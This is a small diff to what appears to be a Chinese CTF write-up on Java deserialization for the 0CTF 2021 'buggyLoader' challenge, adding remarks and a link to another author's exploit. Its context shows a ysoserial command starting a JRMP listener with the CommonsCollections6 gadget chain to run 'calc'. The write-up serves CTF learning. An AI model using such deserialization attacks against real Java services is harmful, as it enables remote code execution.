@@ -76,7 +76,7 @@ public static String objectToHexString(Object obj) throws Exception {
     }
 ```
 
-jrmp 并以为可以打，才发现环境不出网，并且jdk的版本可能会导致不行。。。
+jrmp 并以为可以打，才发现环境不出网，并且jdk的版本可能会导致不行？？？。。。
 
 ```
 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections6 'calc'
@@ -84,7 +84,7 @@ java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections6 
 
 #### 二次反序列化
 
-这里我就直接给exp，exp是 https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/buggyLoader/writeup
+这里我就直接给exp，exp是 https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/buggyLoader/writeup 师傅太猛了。。。
 
 自己并没有做出来，是后面分析出的。。
 
